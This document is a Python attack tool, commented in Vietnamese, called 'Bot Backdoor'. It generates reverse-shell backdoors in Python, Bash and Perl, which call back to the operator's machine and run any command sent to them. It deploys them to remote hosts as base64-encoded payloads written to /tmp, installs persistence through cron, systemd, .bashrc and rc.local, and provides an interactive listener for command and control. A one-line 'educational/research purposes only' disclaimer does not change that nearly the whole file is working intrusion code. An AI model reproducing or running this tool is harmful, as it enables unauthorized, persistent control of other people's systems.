#!/usr/bin/env python3
"""
Bot Backdoor - Tạo backdoor và reverse shell trên bot lạ
Advanced backdoor creation và persistence trên compromised bots
"""

import os
import sys
import time
import json
import socket
import threading
import subprocess
import base64
import hashlib
from datetime import datetime
from typing import Dict, List, Set, Optional
import random
import string

class BotBackdoor:
    def __init__(self, c2_port=7777):
        self.c2_port = c2_port
        self.backdoor_log = "bot_backdoor.log"
        self.active_backdoors = {}
        self.listener_port = 4444
        
    def log_backdoor(self, action: str, target: str, data: str):
        """Log backdoor activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'data': data
        }
        
        try:
            with open(self.backdoor_log, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
        except Exception as e:
            print(f"❌ Error logging: {e}")
    
    def send_command_to_bot(self, bot_ip: str, bot_port: int, command: str) -> Optional[str]:
        """Gửi command đến bot và nhận response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((bot_ip, bot_port))
            sock.send(f"{command}\n".encode())
            response = sock.recv(8192).decode().strip()
            sock.close()
            
            self.log_backdoor("COMMAND_SENT", f"{bot_ip}:{bot_port}", f"Command: {command}")
            return response
            
        except Exception as e:
            print(f"❌ Error sending command to {bot_ip}:{bot_port}: {e}")
            return None
    
    def generate_backdoor_payload(self, backdoor_type: str = "python") -> str:
        """Tạo backdoor payload"""
        if backdoor_type == "python":
            return self.generate_python_backdoor()
        elif backdoor_type == "bash":
            return self.generate_bash_backdoor()
        elif backdoor_type == "perl":
            return self.generate_perl_backdoor()
        else:
            return self.generate_python_backdoor()
    
    def generate_python_backdoor(self) -> str:
        """Tạo Python backdoor"""
        local_ip = self.get_local_ip()
        backdoor_code = f'''
import socket
import subprocess
import os
import sys
import time
import threading
import base64
import json
from datetime import datetime

class Backdoor:
    def __init__(self, host="{local_ip}", port={self.listener_port}):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        
    def connect(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            self.connected = True
            return True
        except Exception as e:
            return False
    
    def send_data(self, data):
        """Send data to C2"""
        try:
            if self.socket:
                self.socket.send(data.encode())
        except:
            pass
    
    def receive_data(self):
        """Receive data from C2"""
        try:
            if self.socket:
                return self.socket.recv(1024).decode()
        except:
            return None
    
    def execute_command(self, command):
        """Execute command and return result"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return f"STDOUT:\\n{{result.stdout}}\\nSTDERR:\\n{{result.stderr}}\\nRETURN_CODE: {{result.returncode}}"
        except Exception as e:
            return f"ERROR: {{str(e)}}"
    
    def run(self):
        """Main backdoor loop"""
        while True:
            try:
                if not self.connected:
                    if not self.connect():
                        time.sleep(30)
                        continue
                
                # Send heartbeat
                self.send_data("HEARTBEAT:" + datetime.now().isoformat())
                
                # Receive command
                command = self.receive_data()
                if command:
                    if command == "EXIT":
                        break
                    elif command.startswith("CMD:"):
                        cmd = command[4:]
                        result = self.execute_command(cmd)
                        self.send_data("RESULT:" + result)
                    elif command == "INFO":
                        info = f"HOSTNAME: {{socket.gethostname()}}\\nUSER: {{os.getenv('USER')}}\\nPID: {{os.getpid()}}\\nCWD: {{os.getcwd()}}"
                        self.send_data("INFO:" + info)
                
                time.sleep(1)
                
            except Exception as e:
                self.connected = False
                if self.socket:
                    self.socket.close()
                time.sleep(30)

if __name__ == "__main__":
    backdoor = Backdoor()
    backdoor.run()
'''
        return backdoor_code
    
    def generate_bash_backdoor(self) -> str:
        """Tạo Bash backdoor"""
        local_ip = self.get_local_ip()
        backdoor_code = f'''#!/bin/bash
# Bash Backdoor
HOST="{local_ip}"
PORT={self.listener_port}

while true; do
    exec 3<>/dev/tcp/$HOST/$PORT
    if [ $? -eq 0 ]; then
        echo "HEARTBEAT:$(date)" >&3
        read -r command <&3
        if [ "$command" = "EXIT" ]; then
            break
        elif [[ "$command" == CMD:* ]]; then
            cmd="${{command#CMD:}}"
            result=$(eval "$cmd" 2>&1)
            echo "RESULT:$result" >&3
        elif [ "$command" = "INFO" ]; then
            info="HOSTNAME:$(hostname)\\nUSER:$(whoami)\\nPID:$$\\nCWD:$(pwd)"
            echo "INFO:$info" >&3
        fi
        exec 3<&-
    fi
    sleep 30
done
'''
        return backdoor_code
    
    def generate_perl_backdoor(self) -> str:
        """Tạo Perl backdoor"""
        local_ip = self.get_local_ip()
        backdoor_code = f'''#!/usr/bin/perl
use Socket;
use IO::Socket::INET;
use POSIX;

$host = "{local_ip}";
$port = {self.listener_port};

while (1) {{
    $socket = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => 'tcp');
    if ($socket) {{
        print $socket "HEARTBEAT:" . localtime() . "\\n";
        $command = <$socket>;
        chomp($command);
        
        if ($command eq "EXIT") {{
            last;
        }} elsif ($command =~ /^CMD:(.*)/) {{
            $cmd = $1;
            $result = `$cmd 2>&1`;
            print $socket "RESULT:$result\\n";
        }} elsif ($command eq "INFO") {{
            $info = "HOSTNAME:" . `hostname` . "USER:" . `whoami` . "PID:" . $$ . "CWD:" . `pwd`;
            print $socket "INFO:$info\\n";
        }}
        close($socket);
    }}
    sleep(30);
}}
'''
        return backdoor_code
    
    def get_local_ip(self) -> str:
        """Lấy local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def deploy_backdoor(self, bot_ip: str, bot_port: int, backdoor_type: str = "python") -> bool:
        """Deploy backdoor lên bot"""
        print(f"🚀 Deploying {backdoor_type} backdoor to {bot_ip}:{bot_port}")
        
        try:
            # Tạo backdoor payload
            payload = self.generate_backdoor_payload(backdoor_type)
            
            # Encode payload
            encoded_payload = base64.b64encode(payload.encode()).decode()
            
            # Tạo command để deploy
            if backdoor_type == "python":
                deploy_command = f"echo '{encoded_payload}' | base64 -d > /tmp/backdoor.py && python3 /tmp/backdoor.py &"
            elif backdoor_type == "bash":
                deploy_command = f"echo '{encoded_payload}' | base64 -d > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh &"
            elif backdoor_type == "perl":
                deploy_command = f"echo '{encoded_payload}' | base64 -d > /tmp/backdoor.pl && chmod +x /tmp/backdoor.pl && perl /tmp/backdoor.pl &"
            
            # Deploy backdoor
            response = self.send_command_to_bot(bot_ip, bot_port, deploy_command)
            
            if response:
                print(f"  ✅ Backdoor deployed successfully")
                self.log_backdoor("BACKDOOR_DEPLOYED", f"{bot_ip}:{bot_port}", f"Type: {backdoor_type}")
                return True
            else:
                print(f"  ❌ Failed to deploy backdoor")
                return False
                
        except Exception as e:
            print(f"❌ Error deploying backdoor: {e}")
            return False
    
    def create_persistence(self, bot_ip: str, bot_port: int) -> bool:
        """Tạo persistence trên bot"""
        print(f"🔒 Creating persistence on {bot_ip}:{bot_port}")
        
        try:
            # Tạo cron job
            cron_command = "echo '*/5 * * * * /tmp/backdoor.py' | crontab -"
            response = self.send_command_to_bot(bot_ip, bot_port, cron_command)
            
            if response:
                print(f"  ✅ Cron job created")
            
            # Tạo systemd service
            service_command = '''cat > /tmp/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /tmp/backdoor.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
systemctl enable /tmp/backdoor.service
systemctl start backdoor.service'''
            
            response = self.send_command_to_bot(bot_ip, bot_port, service_command)
            
            if response:
                print(f"  ✅ Systemd service created")
            
            # Tạo startup script
            startup_command = '''echo '/tmp/backdoor.py &' >> ~/.bashrc
echo '/tmp/backdoor.py &' >> /etc/rc.local'''
            
            response = self.send_command_to_bot(bot_ip, bot_port, startup_command)
            
            if response:
                print(f"  ✅ Startup scripts created")
            
            self.log_backdoor("PERSISTENCE_CREATED", f"{bot_ip}:{bot_port}", "Multiple persistence methods")
            return True
            
        except Exception as e:
            print(f"❌ Error creating persistence: {e}")
            return False
    
    def start_listener(self, port: int = None):
        """Khởi động listener để nhận backdoor connections"""
        if port:
            self.listener_port = port
        
        print(f"🎧 Starting backdoor listener on port {self.listener_port}")
        
        try:
            listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener_socket.bind(('0.0.0.0', self.listener_port))
            listener_socket.listen(5)
            
            print(f"✅ Listener started on port {self.listener_port}")
            print("Waiting for backdoor connections...")
            
            while True:
                try:
                    client_socket, client_address = listener_socket.accept()
                    print(f"🔗 Backdoor connection from {client_address[0]}:{client_address[1]}")
                    
                    # Handle backdoor connection
                    self.handle_backdoor_connection(client_socket, client_address)
                    
                except KeyboardInterrupt:
                    print("\n🛑 Listener stopped by user")
                    break
                except Exception as e:
                    print(f"❌ Listener error: {e}")
                    
        except Exception as e:
            print(f"❌ Failed to start listener: {e}")
        finally:
            listener_socket.close()
    
    def handle_backdoor_connection(self, client_socket: socket.socket, client_address: tuple):
        """Xử lý backdoor connection"""
        try:
            client_socket.settimeout(30)
            
            while True:
                try:
                    # Receive data
                    data = client_socket.recv(1024).decode().strip()
                    if not data:
                        break
                    
                    print(f"📨 Received from {client_address[0]}: {data}")
                    
                    # Parse message
                    if data.startswith("HEARTBEAT:"):
                        print(f"💓 Heartbeat from {client_address[0]}")
                        
                    elif data.startswith("RESULT:"):
                        result = data[7:]
                        print(f"📋 Command result from {client_address[0]}:")
                        print(result)
                        
                    elif data.startswith("INFO:"):
                        info = data[5:]
                        print(f"ℹ️  System info from {client_address[0]}:")
                        print(info)
                    
                    # Send command
                    command = input(f"backdoor@{client_address[0]}:~$ ").strip()
                    
                    if command == "exit":
                        client_socket.send("EXIT\n".encode())
                        break
                    elif command == "info":
                        client_socket.send("INFO\n".encode())
                    elif command:
                        client_socket.send(f"CMD:{command}\n".encode())
                    
                except socket.timeout:
                    print(f"⏰ Timeout waiting for response from {client_address[0]}")
                    break
                except Exception as e:
                    print(f"❌ Error handling connection: {e}")
                    break
                    
        except Exception as e:
            print(f"❌ Error in backdoor connection: {e}")
        finally:
            client_socket.close()
            print(f"🔌 Backdoor connection closed: {client_address[0]}")
    
    def full_backdoor_attack(self, bot_ip: str, bot_port: int) -> bool:
        """Thực hiện full backdoor attack"""
        print(f"🎯 Starting full backdoor attack on {bot_ip}:{bot_port}")
        print("=" * 60)
        
        success = False
        
        # 1. Deploy Python backdoor
        print("1️⃣ Deploying Python backdoor...")
        if self.deploy_backdoor(bot_ip, bot_port, "python"):
            success = True
        
        # 2. Deploy Bash backdoor
        print("\n2️⃣ Deploying Bash backdoor...")
        if self.deploy_backdoor(bot_ip, bot_port, "bash"):
            success = True
        
        # 3. Create persistence
        print("\n3️⃣ Creating persistence...")
        if self.create_persistence(bot_ip, bot_port):
            success = True
        
        # 4. Start listener
        print("\n4️⃣ Starting backdoor listener...")
        if success:
            print("✅ Backdoor attack completed successfully!")
            print("🎧 Starting listener to receive connections...")
            self.start_listener()
        else:
            print("❌ Backdoor attack failed!")
        
        return success
    
    def interactive_backdoor(self):
        """Interactive backdoor mode"""
        print("🎯 Bot Backdoor - Interactive Mode")
        print("=" * 50)
        
        while True:
            print("\n📋 Available commands:")
            print("  1. deploy    - Deploy backdoor to bot")
            print("  2. persist   - Create persistence")
            print("  3. listener  - Start backdoor listener")
            print("  4. attack    - Full backdoor attack")
            print("  5. quit      - Exit")
            
            try:
                command = input("\n🎯 backdoor@c2:~$ ").strip().lower()
                
                if command == "deploy":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    backdoor_type = input("Backdoor type (python/bash/perl): ").strip().lower()
                    self.deploy_backdoor(ip, port, backdoor_type)
                
                elif command == "persist":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.create_persistence(ip, port)
                
                elif command == "listener":
                    port = int(input("Enter listener port (default 4444): ").strip() or "4444")
                    self.start_listener(port)
                
                elif command == "attack":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.full_backdoor_attack(ip, port)
                
                elif command == "quit":
                    break
                
                else:
                    print("❓ Unknown command")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Bot Backdoor - Advanced Backdoor Creation")
    parser.add_argument('--deploy', type=str, help='Deploy backdoor (IP:PORT:TYPE)')
    parser.add_argument('--persist', type=str, help='Create persistence (IP:PORT)')
    parser.add_argument('--listener', type=int, help='Start listener on port')
    parser.add_argument('--attack', type=str, help='Full backdoor attack (IP:PORT)')
    parser.add_argument('--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('--port', type=int, default=7777, help='C2 port to monitor')
    
    args = parser.parse_args()
    
    backdoor = BotBackdoor(args.port)
    
    if args.deploy:
        if ':' in args.deploy:
            parts = args.deploy.split(':')
            if len(parts) >= 3:
                ip, port, backdoor_type = parts[0], int(parts[1]), parts[2]
                backdoor.deploy_backdoor(ip, port, backdoor_type)
            else:
                print("❌ Invalid format. Use IP:PORT:TYPE")
        else:
            print("❌ Invalid format. Use IP:PORT:TYPE")
    
    elif args.persist:
        if ':' in args.persist:
            ip, port = args.persist.split(':', 1)
            port = int(port)
            backdoor.create_persistence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.listener:
        backdoor.start_listener(args.listener)
    
    elif args.attack:
        if ':' in args.attack:
            ip, port = args.attack.split(':', 1)
            port = int(port)
            backdoor.full_backdoor_attack(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.interactive:
        backdoor.interactive_backdoor()
    
    else:
        print("🎯 Bot Backdoor - Advanced Backdoor Creation")
        print("⚠️  For educational/research purposes only!")
        print("")
        print("Available commands:")
        print("  --deploy     Deploy backdoor (IP:PORT:TYPE)")
        print("  --persist    Create persistence (IP:PORT)")
        print("  --listener   Start listener on port")
        print("  --attack     Full backdoor attack (IP:PORT)")
        print("  --interactive Interactive mode")
        print("")
        print("Examples:")
        print("  python3 bot_backdoor.py --deploy 192.168.1.100:7777:python")
        print("  python3 bot_backdoor.py --attack 192.168.1.100:7777")
        print("  python3 bot_backdoor.py --listener 4444")

if __name__ == "__main__":
    main()
